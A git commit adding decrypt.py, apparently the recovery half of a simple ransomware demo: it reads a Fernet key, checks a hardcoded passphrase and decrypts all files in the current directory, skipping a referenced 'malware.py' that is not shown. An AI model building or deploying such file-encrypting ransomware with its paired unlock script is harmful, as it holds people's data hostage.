f734161b8a7663c7e7bcbd3d9b5a6b0a29fd583e
MJ Dhurgesh <dhurgeshcollage@gmail.com>
2024-09-28 00:11:03 +0530

    first commit

---
+++ decrypt.py
@@ -0,0 +1,28 @@
+from cryptography.fernet import Fernet
+import os
+
+allfiles=[]
+for file in os.listdir():
+    if file == "malware.py" or file == "key.key" or file == "decrypt.py":
+        continue
+    if os.path.isfile(file):
+        allfiles.append(file)
+
+print(allfiles)
+
+with open("key.key","rb") as key:
+    password = key.read()
+
+passphase="madjack"
+userphase=input("enter the phases phase i have given u ") 
+
+if passphase==userphase:
+    for file in allfiles:
+        with open(file,"rb") as thefile:
+            content = thefile.read()
+        content_decr = Fernet(password).decrypt(content)
+        with open(file,"wb") as thefile:
+            thefile.write(content_decr)
+        print("the files are decrypted")
+else:
+    print("the password is worng pls enter the coi")
